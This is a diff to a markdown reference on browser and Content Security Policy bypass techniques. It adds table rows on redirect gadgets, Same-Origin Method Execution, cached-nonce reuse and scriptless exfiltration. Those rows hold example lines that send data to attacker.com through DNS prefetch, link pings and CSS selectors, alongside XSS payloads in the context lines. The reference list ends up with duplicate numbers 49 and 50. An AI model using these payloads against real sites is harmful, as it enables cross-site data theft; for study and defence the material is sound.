@@ -102,6 +102,8 @@ JSONP endpoints on whitelisted domains provide the most reliable CSP bypass vect
 | **Open Redirect to JSONP** | Whitelisted domain has open redirect; attacker chains redirect to JSONP endpoint on same or different whitelisted domain | CSP blocks direct load but allows redirect chain ending in JSONP |
 | **JSONP via Relative Path Overwrite (RPO)** | CSP allows specific path; attacker uses path traversal to reach JSONP endpoint | CSP: script-src 'self' whitelisted.com/scripts/react/; attacker uses ../api/jsonp |
 | **User-Controlled JSONP Data** | JSONP endpoint reflects user input in response body, enabling gadget injection | /api/user?id=<script>alert(1)</script>&callback=process |
+| **Third-Party Analytics Redirect Gadget** | Third-party analytics or observability platforms (e.g., New Relic) expose authenticated redirect endpoints that accept arbitrary destination URLs via query parameters. When the analytics domain is CSP-whitelisted for script loading, the redirect endpoint serves as a `script-src` bypass gadget — loading attacker-controlled scripts through the trusted domain | CSP whitelists analytics vendor domain; vendor exposes auth-token redirect or custom event endpoint accepting URL parameter (lab.ctbb.show, 2025) |
+| **Same-Origin Method Execution (SOME)** | JSONP endpoint with an unrestricted callback parameter allows invoking arbitrary JavaScript methods in the page's global scope — the callback value is interpreted as a dotted method-call chain (e.g., `?callback=opener.document.body.innerHTML`), enabling DOM manipulation or data exfiltration through the trusted origin without injecting new script code | CSP whitelists the JSONP origin or allows `script-src 'self'`; callback parameter accepts dotted property paths without alphanumeric-only validation (Ben Hayak, 2015) |
 
 Tools like CSP Evaluator and JSONPeek automate discovery of JSONP endpoints on whitelisted domains. Google, Yahoo, and many CDNs historically hosted exploitable JSONP endpoints.
 
@@ -138,6 +140,8 @@ CSP can be bypassed through DOM manipulation that doesn't create new script exec
 | **AngularJS Template Injection** | AngularJS on whitelisted domain processes {{}} expressions as code | CSP allows angular CDN; attacker injects {{constructor.constructor('alert(1)')()}} |
 | **Mutation XSS (mXSS)** | HTML sanitizer parses differently than browser; mutation during rendering creates script | DOMPurify allows <form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img src onerror=alert(1)>"> (CVE-2024-47875) |
 | **Service Worker Script Registration** | Attacker registers service worker before CSP applies or in scope without CSP | SW script loads before CSP header; subsequent fetches intercepted |
+| **Nonce Reuse via Disk Cache** | Browser disk cache stores full HTTP responses including CSP nonce values in `<script nonce="...">` tags. By forcing cache fallback (e.g., navigating to a cached page, `fetch` with `cache: 'force-cache'`, or exploiting browser heuristic caching), an attacker recovers a previously-issued nonce from the cached response and injects a script tag reusing that nonce — satisfying `script-src 'nonce-...'` policies without needing a fresh nonce from the server | CSP uses nonce-based policy; target page is cacheable (explicit `Cache-Control` or browser heuristic caching); attacker has HTML injection to insert `<script nonce="leaked">` (Jorian Woltjer, 2025) |
+| **Resource Hint / Ping-Based Exfiltration** | When CSP blocks `script-src` and `connect-src`, alternative DOM APIs exfiltrate data without script execution: `<link rel=dns-prefetch href="//stolen-token.attacker.com">` encodes data in DNS subdomain labels; `<a ping="https://attacker.com/collect">` sends a POST beacon on click; `<link rel=preconnect>` triggers TCP/TLS handshake to an attacker endpoint — all bypassing `connect-src` and `default-src` restrictions. Combined with CSS attribute selectors (`input[value^="a"] { background: url(//a.attacker.com) }`) for character-by-character extraction, these primitives enable scriptless data exfiltration from CSP-hardened pages | CSP restricts `script-src` and `connect-src`; attacker has HTML/CSS injection capability; target browser supports `dns-prefetch`, `ping`, or `preconnect` resource hints (filedescriptor, 2017) |
 
 ### §2-5. Policy Injection and Manipulation
 
@@ -668,6 +672,7 @@ This table maps primary attack scenarios to the Security Mechanism categories wh
 | §10-1 | WebAuthn API Hijacking (SquareX DEF CON 2025) | Passkey login bypass via API hijacking through XSS/malicious extension |
 | §10-1 | Synced Passkey Downgrade (Proofpoint 2025) | Entra ID phishing proxy spoofs unsupported browser; user downgrades to SMS/OTP |
 | §9-3 | Service Worker XSS (2024 Research) | 40 websites with 100M+ monthly visitors vulnerable to persistent SW-XSS |
+| §2-1 | CVE-2018-5175 (Firefox) | Universal CSP `strict-dynamic` bypass via `data:` URI — `data:` URIs were exempt from nonce requirement under `strict-dynamic`, allowing script execution without a valid nonce |
 
 ---
 
@@ -786,6 +791,8 @@ Defensive practitioners should assume that **isolation boundaries will be breach
 46. [WebAuthn Logic Flaws | InstaTunnel](https://medium.com/@instatunnel/the-webauthn-loop-common-logic-flaws-in-the-passwordless-handshake-017065517f83)
 47. [Passkeys Pwned: Turning WebAuthn Against Itself | SquareX Labs](https://labs.sqrx.com/passkeys-pwned-turning-webauth-against-itself-0dbddb7ade1a)
 48. [Chrome Extensions Vulnerability Exposes API Keys | Cybersecurity News](https://cybersecuritynews.com/chrome-extensions-vulnerability-exposes-api-keys/)
+49. [Same Origin Method Execution (SOME) | Ben Hayak](https://www.benhayak.com/2015/06/same-origin-method-execution-some.html)
+50. [Bypass CSP Using WordPress by Abusing Same Origin Method Execution | Octagon](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)
 49. [Harvesting Browser Credentials: DPAPI Exploitation | HawkEye](https://hawk-eye.io/2025/08/harvesting-browser-credentials-the-dpapi-exploitation-threat/)
 50. [JIT-Ppcking: differential fuzzing of JavaScript engines | RUB-Repository](https://hss-opus.ub.ruhr-uni-bochum.de/opus4/frontdoor/index/index/year/2024/docId/10992)
 51. [New HTTP/2 Vulnerability Exposes Web Servers to DoS | The Hacker News](https://thehackernews.com/2024/04/new-http2-vulnerability-exposes-web.html)
@@ -796,3 +803,5 @@ Defensive practitioners should assume that **isolation boundaries will be breach
 56. [The State of Browser Security Report 2025 | Keep Aware](https://keepaware.com/resources/guides/state-of-browser-security-report-2025)
 57. [Browser Security Landscape Transformed in 2025 | Security Boulevard](https://securityboulevard.com/2025/06/browser-security-landscape-transformed-in-2025/)
 58. [Looking back at our Bug Bounty program in 2024 | Meta Engineering](https://engineering.fb.com/2025/02/13/security/looking-back-at-our-bug-bounty-program-in-2024/)
+59. Ben Hayak — "Same Origin Method Execution (SOME)" (DEF CON 2015): JSONP callback endpoints abused to invoke arbitrary same-origin JavaScript methods, bypassing CSP. Reapplied in octagon.net WordPress CSP bypass (2022).
+60. GitHub — "GitHub's post-CSP journey" (Mike West & GitHub Security, 2017): Documents the iterative real-world deployment of CSP on a large-scale production application — migrating from whitelist-based CSP to nonce-based policy, adopting `strict-dynamic`, eliminating `unsafe-inline`, and addressing breakage from third-party scripts. A key case study demonstrating that CSP deployment is a multi-phase operational challenge, not a one-time header addition.
